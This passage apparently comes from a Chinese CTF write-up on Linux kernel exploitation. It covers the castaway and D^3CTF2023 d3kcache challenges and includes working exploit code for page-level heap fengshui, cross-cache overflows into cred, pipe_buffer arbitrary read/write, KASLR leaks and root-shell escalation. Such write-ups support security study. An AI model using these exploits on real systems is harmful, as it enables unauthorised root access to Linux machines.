int pipe_parent_read[2];
int pipe_child_read[2];

size_t socket_fd[0x1000];
struct request_dev{
    size_t index;
    size_t size;
    size_t buf;
};
enum request_socket_page_cmd
{
    alloc_page,
    free_page,
    exit_page,
};

void bind_core(int core) {
    cpu_set_t cpu_set;

    CPU_ZERO(&cpu_set);
    CPU_SET(core, &cpu_set);
    sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
}

struct request
{
    enum request_socket_page_cmd cmd;
    size_t idx;

};

struct tpacket_req{
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};
int alloc_pages_via_sock(uint32_t size, uint32_t n){
    struct tpacket_req req;
    int32_t socketfd, version;

    /* Create the AF_PACKET socket */
    socketfd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    version = TPACKET_V1;
    setsockopt(socketfd, SOL_PACKET, PACKET_VERSION, &version, sizeof(version));
    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = n;
    req.tp_frame_size = 4096;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr)/req.tp_frame_size;
    setsockopt(socketfd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    return socketfd;
}

size_t socketfds[0x500];
void socker_page_spray_prepare()
{   puts("start fork");
    if(!fork())
    {   
        uid_t uid=getuid();
        gid_t gid=getpid();
        int temp;
        char edit[0x100];
        unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);     //Create new namespace and get in
        temp = open("/proc/self/setgroups", O_WRONLY);
        write(temp, "deny", strlen("deny"));
        close(temp);
        temp = open("/proc/self/uid_map", O_WRONLY);
        snprintf(edit, sizeof(edit), "0 %d 1", uid);
        write(temp, edit, strlen(edit));
        close(temp);
        temp = open("/proc/self/gid_map", O_WRONLY);
        snprintf(edit, sizeof(edit), "0 %d 1", gid);
        write(temp, edit, strlen(edit));
        close(temp);
        puts("create new namespace");
        struct request req;
        size_t result;
        do{
            read(pipe_child_read[0], &req, sizeof(req));
            if(req.cmd == alloc_page){
                socketfds[req.idx] = alloc_pages_via_sock(4096, 1);
            }else if (req.cmd == free_page){
                close(socketfds[req.idx]);
            }
            result = req.idx;
            write(pipe_parent_read[1], &result, sizeof(result));
        }while(req.cmd != exit_page);
    }
}

int rootfd[2];
char root[] = "root\n";
char throwaway[0x100];
struct timespec timer = {.tv_sec = 1000000000, .tv_nsec = 0};
char binsh[] = "/bin/sh\x00";
char *args[] = {"/bin/sh", NULL};
__attribute__((naked)) void check_and_wait()
{
    asm(
        "lea rax, [rootfd];"
        "mov edi, dword ptr [rax];"
        "lea rsi, [throwaway];"
        "mov rdx, 1;"
        "xor rax, rax;"
        "syscall;"              //read(rootfd, throwaway, 1)
        "mov rax, 102;"         
        "syscall;"              //getuid()
        "cmp rax, 0;"           // not root, goto finish
        "jne finish;"
        "mov rdi, 1;"
        "lea rsi, [root];"
        "mov rdx, 5;"
        "mov rax, 1;"
        "syscall;"              //write(1, root, 5)
        "lea rdi, [binsh];"
        "lea rsi, [args];"
        "xor rdx, rdx;"
        "mov rax, 59;"
        "syscall;"              //execve("/bin/sh", args, 0)
        "finish:"
        "lea rdi, [timer];"
        "xor rsi, rsi;"
        "mov rax, 35;"
        "syscall;"              //nanosleep()
        "ret;");
}
__attribute__((naked)) pid_t clone_and_getsh(uint64_t flags, void *dest)
{

    asm("mov r15, rsi;"
        "xor rsi, rsi;"
        "xor rdx, rdx;"
        "xor r10, r10;"
        "xor r9, r9;"
        "mov rax, 56;"
        "syscall;"
        "cmp rax, 0;"
        "jl bad_end;"
        "jg good_end;"
        "jmp r15;"
        "bad_end:"
        "neg rax;"
        "ret;"
        "good_end:"
        "ret;");

}
int main()
{   pipe(rootfd);
    pipe(pipe_parent_read);
    pipe(pipe_child_read);
    struct request request_cmd;
    size_t result;
    puts("Step 1: Open the vulnurability driver...");
    size_t fd = open("/dev/castaway", O_RDONLY);
    bind_core(0);
    //create child process and Cyclically waiting for the parent process to send commands to allocate or release pages
    puts("Step 2: Construct two pipe for communicating in those namespace...");
    socker_page_spray_prepare();
    sleep(0x1);
    //spray page
    puts("Step 3: use setsocket to heap spray many one page ");
    for(int i = 0; i < 0x400; i++){
        request_cmd.cmd=alloc_page;
        request_cmd.idx=i;
        write(pipe_child_read[1],&request_cmd,sizeof(request_cmd));
        read(pipe_parent_read[0],&result,sizeof(result));
    } 
    puts("Step 4: spray free next one page to use cred ");
    for(int i = 0x400/2+1; i < 0x400; i+=2){
        request_cmd.cmd=free_page;
        request_cmd.idx=i;
        write(pipe_child_read[1],&request_cmd,sizeof(request_cmd));
        read(pipe_parent_read[0],&result,sizeof(result));
    } 
    puts("Step 5: spray clone to alloc page to use cred ");
    for(int i = 0; i < 0x100; i++){
            clone_and_getsh(CLONE_FILES | CLONE_FS | CLONE_VM | CLONE_SIGHAND,&check_and_wait);
    } 
    puts("Step 6: spray free front one page to use the castaway_ioctl_add ");
    for(int i = 0x400/2; i < 0x400; i+=2){
        request_cmd.cmd=free_page;
        request_cmd.idx=i;
        write(pipe_child_read[1],&request_cmd,sizeof(request_cmd));
        read(pipe_parent_read[0],&result,sizeof(result));
    } 
    char object_buf[CHUNK_SIZE];
    *(uint32_t *)&object_buf[CHUNK_SIZE - 0x6] = 1;
    puts("Step 7: spray castaway_ioctl_add alloc one page to overflow to cred ");
   for(int i = 0; i < 0x100; i++){
        ioctl(fd, ALLOC, 0);
        struct request_dev req_dev = {.index = i, .size = CHUNK_SIZE, .buf = object_buf};
        ioctl(fd, EDIT, (unsigned long)&req_dev);

    }
    write(rootfd[1], object_buf, CHUNK_SIZE);
    sleep(10000);

} 

```

off by one + Page-level Heap Fengshui (Page level UAF)
======================================================

这种攻击手法主要指的是对内存页结构体 page 的释放后利用

D^3CTF2023 d3kcache
-------------------

root调试
------

> 感谢Nightu和flyyy师傅的帮助！！

发现虽然`rdinit=/sbin/init`，但可以改`/etc/init.d/rcS`来修改启动权限

ext4文件系统相关打包
------------

通过mount来挂载，然后赋值进去，然后卸载即可

```bash
if [ ! -d rootfs ]; then
    mkdir rootfs
fi

sudo mount rootfs.img rootfs

cp exp rootfs/
sudo umount rootfs
```

题目说明flag在/root/flag，ext4文件系统，对应init文件在`./etc/init.d/rcS`里

`d3kcache_ioctl`会根据ioctl命令执行不同的操作：

a. 命令276（创建新缓存）：  
b. 命令1300（向现有缓存追加数据）：  
c. 命令2064（释放缓存）：  
d. 命令6425（从缓存读取数据）：

使用了一个全局数组`qword_17D8`来存储缓存指针，使用`kcache_list`来存储缓存大小。

```c
__int64 __fastcall d3kcache_ioctl(__int64 a1, int cmd, __int64 value)
{
  __int64 v4; // rax
  __int64 v5; // rbx
  int size_2; // ecx
  char *current_ptr; // r14
  __int64 size_3; // r15
  __int64 ptr_1; // r12
  int size_1; // ecx
  __int64 size; // rbx
  __int64 object_ptr; // r14
  __int64 ptr; // r15
  __int64 object; // rax
  __int64 object_1; // r15
  unsigned int max_range_1; // r13d
  __int64 size_4; // r14
  __int64 ptr_2; // r12
  __int64 index_1; // r14
  unsigned __int64 index_2; // rbx
  __int64 max_range; // rax
  __int64 index; // r12
  unsigned __int64 index_3; // rbx
  const char *v25; // rdi
  struct userdata data; // [rsp-48h] [rbp-48h] BYREF
  unsigned __int64 v27; // [rsp-38h] [rbp-38h]

  v27 = __readgsqword(0x28u);
  raw_spin_lock(&spin);
  v4 = copy_from_user(&data, value, 16LL);
  v5 = -1LL;
  if ( v4 )
    goto LABEL_2;
  if ( cmd > 0x80F )
  {
    if ( cmd == 0x810 )                         // free
    {
      if ( data.index > 0xFuLL || !qword_17D8[2 * data.index] )
      {
        v25 = "\x011[d3kcache:] Invalid index to release.";
        goto LABEL_46;
      }
      kmem_cache_free(kcache_jar);
      index_1 = data.index;
      if ( (unsigned __int64)data.index > 0xF )
      {
        _ubsan_handle_out_of_bounds(&off_12A0, data.index);
        index_2 = data.index;
        qword_17D8[2 * index_1] = 0LL;
        if ( index_2 >= 0x10 )
          _ubsan_handle_out_of_bounds(&off_12C0, (unsigned int)index_2);
      }
      else
      {
        qword_17D8[2 * data.index] = 0LL;
        index_2 = (unsigned int)index_1;
      }
      size_array[4 * index_2] = 0;
      v5 = 0LL;
    }
    else
    {
      if ( cmd != 0x1919 )                      // read
        goto LABEL_42;
      if ( data.index > 0xFuLL || !qword_17D8[2 * data.index] )
      {
        v25 = "\x011[d3kcache:] Invalid index to read.";
        goto LABEL_46;
      }
      size_1 = data.size;
      if ( data.size > (unsigned int)size_array[4 * data.index] )
        size_1 = size_array[4 * data.index];
      if ( size_1 < 0 )
        BUG();
      size = (unsigned int)size_1;
      object_ptr = qword_17D8[2 * data.index];
      ptr = data.ptr;
      _check_object_size(object_ptr, (unsigned int)size_1, 1LL);
      v5 = -(__int64)(copy_to_user(ptr, object_ptr, size) != 0);
    }
  }
  else
  {
    if ( cmd != 0x114 )
    {
      if ( cmd == 0x514 )
      {
        if ( data.index <= 0xFuLL && qword_17D8[2 * data.index] )// write
        {
          size_2 = data.size;
          if ( data.size > 0x800u || (unsigned int)(data.size + size_array[4 * data.index]) >= 0x800 )
            size_2 = 2048 - size_array[4 * data.index];
          if ( size_2 < 0 )
            BUG();
          current_ptr = (char *)(qword_17D8[2 * data.index] + (unsigned int)size_array[4 * data.index]);
          size_3 = (unsigned int)size_2;
          ptr_1 = data.ptr;
          _check_object_size(current_ptr, (unsigned int)size_2, 0LL);
          if ( !copy_from_user(current_ptr, ptr_1, size_3) )
          {
            current_ptr[size_3] = 0;
            v5 = 0LL;
          }
          goto LABEL_2;
        }
        v25 = "\x011[d3kcache:] Invalid index to write.";
LABEL_46:
        printk(v25);
        goto LABEL_2;
      }
LABEL_42:
      v25 = "\x011[d3kcache:] Invalid command.";
      goto LABEL_46;
    }
    if ( data.index >= 0x10uLL )
    {
      v25 = "\x011[d3kcache:] Invalid index to allocate.";
      goto LABEL_46;
    }
    if ( qword_17D8[2 * data.index] )
    {
      v25 = "\x011[d3kcache:] Index already in use.";
      goto LABEL_46;
    }
    object = kmem_cache_alloc(kcache_jar, 0xDC0LL);// add
    if ( !object )
    {
      v25 = "\x011[d3kcache:] Out of memory.";
      goto LABEL_46;
    }
    object_1 = object;
    max_range_1 = data.size;
    size_4 = 0x800LL;
    if ( data.size < 0x800u )
      size_4 = (unsigned int)data.size;
    ptr_2 = data.ptr;
    _check_object_size(object, size_4, 0LL);
    if ( copy_from_user(object_1, ptr_2, size_4) )
    {
      kmem_cache_free(kcache_jar);
    }
    else
    {
      max_range = 0x7FFLL;
      if ( max_range_1 < 0x7FF )
        max_range = max_range_1;
      *(_BYTE *)(object_1 + max_range) = 0;
      index = data.index;
      if ( (unsigned __int64)data.index > 0xF )
      {
        _ubsan_handle_out_of_bounds(&off_1260, data.index);
        index_3 = data.index;
        qword_17D8[2 * index] = object_1;
        if ( index_3 >= 0x10 )
          _ubsan_handle_out_of_bounds(&off_1280, (unsigned int)index_3);
      }
      else
      {
        qword_17D8[2 * data.index] = object_1;
        index_3 = (unsigned int)index;
      }
      size_array[4 * index_3] = size_4;
      v5 = 0LL;
    }
  }
LABEL_2:
  raw_spin_unlock(&spin);
  return v5;
}
```

### `struct page` 指针和线性映射区和vmemmap

#### 1. 线性映射区和物理地址的关系

在 Linux 内核中，**线性映射区**（也称为直接映射区）是虚拟地址空间的一部分，它直接映射了物理内存地址。这意味着给定一个物理地址，可以通过加上一个固定的偏移量（`PAGE_OFFSET`）得到其在线性映射区的虚拟地址，反之亦然。

在 x86\_64 架构上，`PAGE_OFFSET` 一般是 `0xffff888000000000`，这是内核的线性映射区的起始地址。假设我们有一个线性映射区的虚拟地址 `0xffff888012345000`，我们可以通过减去 `PAGE_OFFSET` 来得到对应的物理地址。

#### 2. 计算物理地址

假设 `PAGE_OFFSET` 是 `0xffff888000000000`：

```c
unsigned long linear_address = 0xffff888012345000;
unsigned long physical_address = linear_address - PAGE_OFFSET;
```

计算结果为：

```c
physical_address = 0xffff888012345000 - 0xffff888000000000
                 = 0x12345000
```

这个物理地址就是 `0x12345000`。

#### 3. 转换物理地址为 `struct page` 指针

在 Linux 内核中，物理内存页的管理是通过 `struct page` 结构体来进行的。每个物理页都有一个对应的 `struct page` 结构体，并且这些结构体通常是连续存储在内核的一个数组（`vmemmap`数组是一个全局数组，它映射了所有物理页的 struct page 结构体。这个数组的每个元素对应一个物理页的 struct page 结构体。）中。这个数组的每个元素对应一个物理页。

为了从物理地址转换为 `struct page` 指针，需要以下步骤：

1. **物理地址转换为页帧号（PFN）**：
    
    
    - 页帧号是物理地址除以页大小（通常是 4KB）。 ```c
        unsigned long pfn = physical_address >> PAGE_SHIFT;
        ```
        
        其中 `PAGE_SHIFT` 是页大小的位移数，对于 4KB 页大小，`PAGE_SHIFT` 为 12。
2. **页帧号转换为 `struct page` 指针**：
    
    
    - 内核提供了一个宏 `pfn_to_page(pfn)`，它通过页帧号找到对应的 `struct page` 结构体。这个宏的结果是 vmemmap 数组中对应 PFN 的 struct page 结构体的虚拟地址。 ```c
        struct page *page = pfn_to_page(pfn);
        ```

#### 示例代码

将上述步骤结合起来，代码如下：

```c
#define PAGE_OFFSET 0xffff888000000000UL
#define PAGE_SHIFT 12

unsigned long linear_address = 0xffff888012345000;
unsigned long physical_address = linear_address - PAGE_OFFSET;
unsigned long pfn = physical_address >> PAGE_SHIFT;
struct page *page = pfn_to_page(pfn);
```

### pipebuffer

<https://www.51cto.com/article/684282.html>

fcntl重新分配size时候会先kcalloc，然后复制原来pipbuffer（page有数据的）的内容到kcalloc分配的pipbuffer里

读:pipebuffer 读会通过pipebuffer -&gt;offset 和pipebuffer -&gt;len和page，读完后`pipebuffer ->offset =pipebuffer ->offset +pipebuffer ->len`  
写：pipebuffer 写会在`pipebuffer ->offset +pipebuffer ->len`开始写，`pipebuffer ->len=pipebuffer ->len+写入的字节数`

另外写pipe的时候才会分配物理页给page

### 利用

漏洞在于 命令1300（向现有缓存追加数据）：存在off by null的漏洞

由于是独立的cache，没有其他结构体和它会在一个cache中，但是会有结构体所在的cache和它来自同一个buddy来自一个order，所以只能考虑页级堆分水来造成cross-cache

### 一级页UAF

这里考虑相同的order，2k对应3，所以也寻找分配order为3的cache，这样有可能会来自同一个order4的内存块，然后两个order3的cache相邻，前一个order为3的cache的最后一个object为kcache\_jar，后一个order为3的cache的第一个object又正好为某个结构体的object，就能够造成off by null溢出该结构体了

- 因为要来自order为4的内存块，并且是相邻物理地址的两个，可以分配大部分order为3的内存块消耗掉不连续的，然后就可以得到连续的一部分order3的内存，然为了保证得到相邻的，可以喷一部分slab，然后一个kcache\_jar slab，再喷一部分slab，然后kcache\_jar 就夹在要溢出的slab上

### 二级页UAF

利用fcntl修改pipebuffer的个数,使得重新分配kmalloc-96大小的object存储pipbuffer数组,然后在已经被free的page填满pipebuffer,就可以利用page UAF读出其中的一个pipe的pipebuffer，然后wirte修改其中相邻的pipe的pipebuffer，造成存在两个pipe里存在相同的pipbuffer，然后close掉被读出的pipebuffer所在的pipe，此时被写pipebuffer所在的pipe的pipebuffer构成UAF

### 任意读写

fcntl修改pipbuffer数量，重新分配，申请kmalloc-192来存pipebuffer，然后在二级UAF的页填满kmalloc-192 的pipebuffer,然后分别写三个pipe的第一个pipebuffer为之前读出来的pipebuffer，并且设置好offset和len都为192，这样当读的时候可以读到之前读出来的pipebuffer，而之前读出来的pipebuffer的page就是当前的二级UAF的页

- 扫描各个pipe读，如果page为二级UAF页此时能够读出page，如果和之前读出来的一样可以认为当前是三个pipe之一，然后都找出来。
- 然后创建任意读写，首先往第3个pipebuffer写第2个pipebuffer的offset为第3个pipebuffer的偏移，然后按照如下循环，首先第2个pipebuffer能写第3个pipebuffer的offset为第一个pipebuffer的偏移，此时第3个pipebuffer能写第1个pipebuffer和第2个pipebuffer，此时写第一个pipebuffer的page要读的页，写第二个pipebuffer的offset为第三个pipebuffer的offset

### 泄露task\_struct和kernel\_base

- 先根据page和粒度通过异或猜测得到vmemmap\_base
- 然后根据第156页开始处存在`secondary_startup_64`函数地址，然后可以得到偏移，进而得到基地址

```c
  /**
     * KASLR's granularity is 256MB, and pages of size 0x1000000 is 1GB MEM,
     * so we can simply get the vmemmap_base like this in a SMALL-MEM env.
     * For MEM > 1GB, we can just find the secondary_startup_64 func ptr,
     * which is located on physmem_base + 0x9d000, i.e., vmemmap_base[156] page.
     * If the func ptr is not there, just vmemmap_base -= 256MB and do it again.
     */
    vmemmap_base = (size_t) info_pipe_buf.page & 0xfffffffff0000000;
    for (;;) {
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + 157 * 0x40), buf);

        if (buf[0] > 0xffffffff81000000 && ((buf[0] & 0xfff) == 0x070)) {
            kernel_base = buf[0] -  0x070;
            kernel_offset = kernel_base - 0xffffffff81000000;
            printf("\033[32m\033[1m[+] Found kernel base: \033[0m0x%lx\n"
                   "\033[32m\033[1m[+] Kernel offset: \033[0m0x%lx\n", 
                   kernel_base, kernel_offset);
            break;
        }

        vmemmap_base -= 0x10000000;
    }
    printf("\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n", vmemmap_base);
```

- prctl命名当前进程名字
- 扫描页根据进程名字找到task\_struct，根据task\_struct::ptraced points泄露当前task\_struct，并根据当前第几页来得到page\_offset\_base
    
    ```c
    /* now seeking for the task_struct in kernel memory */
    puts("[*] Seeking task_struct in memory...");
    
    prctl(PR_SET_NAME, "arttnba3pwnn");
    
    /**
     * For a machine with MEM less than 256M, we can simply get the:
     *      page_offset_base = heap_leak & 0xfffffffff0000000;
     * But that's not always accurate, espacially on a machine with MEM > 256M.
     * So we need to find another way to calculate the page_offset_base.
     * 
     * Luckily the task_struct::ptraced points to itself, so we can get the
     * page_offset_base by vmmemap and current task_struct as we know the page.
     * 
     * Note that the offset of different filed should be referred to your env.
     */
    for (int i = 0; 1; i++) {
        arbitrary_read_by_pipe((struct page*) (vmemmap_base + i * 0x40), buf);
    
        comm_addr = memmem(buf, 0xf00, "arttnba3pwnn", 12);
        if (comm_addr && (comm_addr[-2] > 0xffff888000000000) /* task->cred */
            && (comm_addr[-3] > 0xffff888000000000) /* task->real_cred */
            && (comm_addr[-57] > 0xffff888000000000) /* task->read_parent */
            && (comm_addr[-56] > 0xffff888000000000)) {  /* task->parent */
    
            /* task->read_parent */
            parent_task = comm_addr[-57];
    
            /* task_struct::ptraced */
            current_task = comm_addr[-50] - 2528;
    
            page_offset_base = (comm_addr[-50]&0xfffffffffffff000) - i * 0x1000;
            page_offset_base &= 0xfffffffff0000000;
    
            printf("\033[32m\033[1m[+] Found task_struct on page: \033[0m%p\n",
                   (struct page*) (vmemmap_base + i * 0x40));
            printf("\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n",
                   page_offset_base);
            printf("\033[34m\033[1m[*] current task_struct's addr: \033[0m"
                   "0x%lx\n\n", current_task);
            break;
        }
    ```

### 提权

#### init\_cred提权

根据当前task\_struct的real\_parent是父进程的task\_struct虚拟地址来不断向父进程追踪，直到real\_parent指向自己即为`init_task`，然后将init\_task的init\_cred写当前task\_struct 的 cred 指针指向 init\_cred

#### 内核栈写 rop

页表的地址可以通过 mm\_struct 获取， mm\_struct 地址可以通过 task\_struct 获取，内核栈地址同样可以通过 task\_struct 获取

通过 task\_struct 的 stack 指针我们可以获取到内核栈的地址。然后通过页表转换得到栈的物理地址进而得到对应页，之后我们可以向对应页喷射 rop 实现提权。

#### USMA

- mmap一段内存，通过修改页表使得mmap的虚拟内存映射到ns\_capable\_setid函数对应物理地址处，然后对mmap进行写shellcode从而修改ns\_capable\_setid函数，这里ns\_capable\_setid函数是代码段是 2M 的大页而不是 4K 的内存页，因此解析的是 3 级页表而不是 4 级页表。所以最终mmap虚拟内存映射到的第四级页表中的页表项是2M 的大页地址
- shellcode可以修改 ns\_capable\_setid 的返回值恒为 1 。在调用 setresuid(0, 0, 0) 提升权限的时候会通过 ns\_capable\_setid 判断是否允许，在修改 ns\_capable\_setid 函数后我们可以使用 setresuid(0, 0, 0) 提权。

### exp

```c
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <asm/ldt.h>
#include <assert.h>
#include <ctype.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/keyctl.h>
#include <linux/userfaultfd.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <semaphore.h>
#include <signal.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/prctl.h>
#include <sys/sem.h>
#include <sys/shm.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/xattr.h>
#include <unistd.h>
#include <sys/sysinfo.h>

int randint(int min, int max) {
    return min + (rand() % (max - min));
}

void bind_core(bool fixed, bool thread) {
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(fixed ? 0 : randint(1, get_nprocs()), &cpu_set);
    if (thread) {
        pthread_setaffinity_np(pthread_self(), sizeof(cpu_set), &cpu_set);
        //用于设置某个线程的 CPU 亲和性。
    } else {
        sched_setaffinity(getpid(), sizeof(cpu_set), &cpu_set);
        //用于设置整个进程的 CPU 亲和性。
    }
}

void qword_dump(char *desc, void *addr, int len) {
    uint64_t *buf64 = (uint64_t *) addr;
    uint8_t *buf8 = (uint8_t *) addr;
    if (desc != NULL) {
        printf("[*] %s:\n", desc);
    }
    for (int i = 0; i < len / 8; i += 4) {
        printf("  %04x", i * 8);
        for (int j = 0; j < 4; j++) {
            i + j < len / 8 ? printf(" 0x%016lx", buf64[i + j]) : printf("                   ");
        }
        printf("   ");
        for (int j = 0; j < 32 && j + i * 8 < len; j++) {
            printf("%c", isprint(buf8[i * 8 + j]) ? buf8[i * 8 + j] : '.');
        }
        puts("");
    }
}

void byte_dump(char *desc, void *addr, int len) {
    uint8_t *buf8 = (unsigned char *) addr;
    if (desc != NULL) {
        printf("[*] %s:\n", desc);
    }
    for (int i = 0; i < len; i += 16) {
        printf("  %04x", i);
        for (int j = 0; j < 16; j++) {
            i + j < len ? printf(" %02x", buf8[i + j]) : printf("   ");
        }
        printf("   ");
        for (int j = 0; j < 16 && j + i < len; j++) {
            printf("%c", isprint(buf8[i + j]) ? buf8[i + j] : '.');
        }
        puts("");
    }
}

bool is_kernel_text_addr(size_t addr) {
    return addr >= 0xFFFFFFFF80000000 && addr <= 0xFFFFFFFFFEFFFFFF;
//    return addr >= 0xFFFFFFFF80000000 && addr <= 0xFFFFFFFF9FFFFFFF;
}

bool is_dir_mapping_addr(size_t addr) {
    return addr >= 0xFFFF888000000000 && addr <= 0xFFFFc87FFFFFFFFF;
}

size_t user_cs, user_rflags, user_sp, user_ss;

void save_status() {
    __asm__("mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_sp, rsp;"
            "pushf;"
            "pop user_rflags;");
    puts("[*] status has been saved.");
}

/**
 * @brief create an isolate namespace
 * note that the caller **SHOULD NOT** be used to get the root, but an operator
 * to perform basic exploiting operations in it only
 */
void unshare_setup(void) {
    char edit[0x100];
    int tmp_fd;

    unshare(CLONE_NEWNS | CLONE_NEWUSER | CLONE_NEWNET);

    tmp_fd = open("/proc/self/setgroups", O_WRONLY);
    write(tmp_fd, "deny", strlen("deny"));
    close(tmp_fd);

    tmp_fd = open("/proc/self/uid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getuid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);

    tmp_fd = open("/proc/self/gid_map", O_WRONLY);
    snprintf(edit, sizeof(edit), "0 %d 1", getgid());
    write(tmp_fd, edit, strlen(edit));
    close(tmp_fd);
}
/**
 * III -  pgv pages sprayer related
 * not that we should create two process:
 * - the parent is the one to send cmd and get root
 * - the child creates an isolate userspace by calling unshare_setup(),
 *      receiving cmd from parent and operates it only
 */
#define PGV_PAGE_NUM 1000
#define PACKET_VERSION 10
#define PACKET_TX_RING 13

struct tpacket_req {
    unsigned int tp_block_size;
    unsigned int tp_block_nr;
    unsigned int tp_frame_size;
    unsigned int tp_frame_nr;
};

/* each allocation is (size * nr) bytes, aligned to PAGE_SIZE */
struct pgv_page_request {
    int idx;
    int cmd;
    unsigned int size;
    unsigned int nr;
};

/* operations type */
enum {
    CMD_ALLOC_PAGE,
    CMD_FREE_PAGE,
    CMD_EXIT,
};

/* tpacket version for setsockopt */
enum tpacket_versions {
    TPACKET_V1,
    TPACKET_V2,
    TPACKET_V3,
};

/* pipe for cmd communication */
int cmd_pipe_req[2], cmd_pipe_reply[2];

/* create a socket and alloc pages, return the socket fd */
int create_socket_and_alloc_pages(unsigned int size, unsigned int nr) {
    struct tpacket_req req;
    int socket_fd, version;
    int ret;

    socket_fd = socket(AF_PACKET, SOCK_RAW, PF_PACKET);
    if (socket_fd < 0) {
        printf("[x] failed at socket(AF_PACKET, SOCK_RAW, PF_PACKET)\n");
        ret = socket_fd;
        goto err_out;
    }

    version = TPACKET_V1;
    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_VERSION,
                     &version, sizeof(version));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_VERSION)\n");
        goto err_setsockopt;
    }

    memset(&req, 0, sizeof(req));
    req.tp_block_size = size;
    req.tp_block_nr = nr;
    req.tp_frame_size = 0x1000;
    req.tp_frame_nr = (req.tp_block_size * req.tp_block_nr) / req.tp_frame_size;

    ret = setsockopt(socket_fd, SOL_PACKET, PACKET_TX_RING, &req, sizeof(req));
    if (ret < 0) {
        printf("[x] failed at setsockopt(PACKET_TX_RING)\n");
        goto err_setsockopt;
    }

    return socket_fd;

    err_setsockopt:
    close(socket_fd);
    err_out:
    return ret;
}

/* the parent process should call it to send command of allocation to child */
int alloc_page(int idx, unsigned int size, unsigned int nr) {
    struct pgv_page_request req = {
            .idx = idx,
            .cmd = CMD_ALLOC_PAGE,
            .size = size,
            .nr = nr,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(struct pgv_page_request));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));

    return ret;
}

/* the parent process should call it to send command of freeing to child */
int free_page(int idx) {
    struct pgv_page_request req = {
            .idx = idx,
            .cmd = CMD_FREE_PAGE,
    };
    int ret;

    write(cmd_pipe_req[1], &req, sizeof(req));
    read(cmd_pipe_reply[0], &ret, sizeof(ret));
    usleep(10000);
    return ret;
}

/* the child, handler for commands from the pipe */
void spray_cmd_handler(void) {
    struct pgv_page_request req;
    int socket_fd[PGV_PAGE_NUM];
    int ret;

    /* create an isolate namespace*/
    unshare_setup();

    /* handler request */
    do {
        read(cmd_pipe_req[0], &req, sizeof(req));

        if (req.cmd == CMD_ALLOC_PAGE) {
            ret = create_socket_and_alloc_pages(req.size, req.nr);
            socket_fd[req.idx] = ret;
        } else if (req.cmd == CMD_FREE_PAGE) {
            ret = close(socket_fd[req.idx]);
        } else {
            printf("[x] invalid request: %d\n", req.cmd);
        }

        write(cmd_pipe_reply[1], &ret, sizeof(ret));
    } while (req.cmd != CMD_EXIT);
}

/* init pgv-exploit subsystem :) */
void prepare_pgv_system(void) {
    /* pipe for pgv */
    pipe(cmd_pipe_req);
    pipe(cmd_pipe_reply);

    /* child process for pages spray */
    if (!fork()) {
        spray_cmd_handler();
    }
}

/**
 * IV - config for page-level heap spray and heap fengshui
 */
#define PIPE_SPRAY_NUM 200

#define PGV_1PAGE_SPRAY_NUM 0x20

#define PGV_4PAGES_START_IDX PGV_1PAGE_SPRAY_NUM
#define PGV_4PAGES_SPRAY_NUM 0x40

#define PGV_8PAGES_START_IDX (PGV_4PAGES_START_IDX + PGV_4PAGES_SPRAY_NUM)
#define PGV_8PAGES_SPRAY_NUM 0x40

int pgv_1page_start_idx = 0;
int pgv_4pages_start_idx = PGV_4PAGES_START_IDX;
int pgv_8pages_start_idx = PGV_8PAGES_START_IDX;

/* spray pages in different size for various usages */
void prepare_pgv_pages(void) {
    /**
     * We want a more clear and continuous memory there, which require us to
     * make the noise less in allocating order-3 pages.
     * So we pre-allocate the pages for those noisy objects there.
     */
    puts("[*] spray pgv order-0 pages...");
    for (int i = 0; i < PGV_1PAGE_SPRAY_NUM; i++) {
        if (alloc_page(i, 0x1000, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("[*] spray pgv order-2 pages...");
    for (int i = 0; i < PGV_4PAGES_SPRAY_NUM; i++) {
        if (alloc_page(PGV_4PAGES_START_IDX + i, 0x1000 * 4, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    /* spray 8 pages for page-level heap fengshui */
    puts("[*] spray pgv order-3 pages...");
    for (int i = 0; i < PGV_8PAGES_SPRAY_NUM; i++) {
        /* a socket need 1 obj: sock_inode_cache  832   19    4 , 19 objs for 1 slub on 4 page*/
        if (i % 19 == 0) {
            free_page(pgv_4pages_start_idx++);
        }

        /* a socket need 1 dentry: dentry  192   21    1, 21 objs for 1 slub on 1 page */
        if (i % 21 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        /* a pgv need 1 obj: kmalloc-8  8  512    1, 512 objs for 1 slub on 1 page*/
        if (i % 512 == 0) {
            free_page(pgv_1page_start_idx += 2);
        }

        if (alloc_page(PGV_8PAGES_START_IDX + i, 0x1000 * 8, 1) < 0) {
            printf("[x] failed to create %d socket for pages spraying!\n", i);
        }
    }

    puts("");
}

int kcache_fd;

typedef struct {
    int index;
    uint32_t size;
    void *buf;
} kcache_cmd;

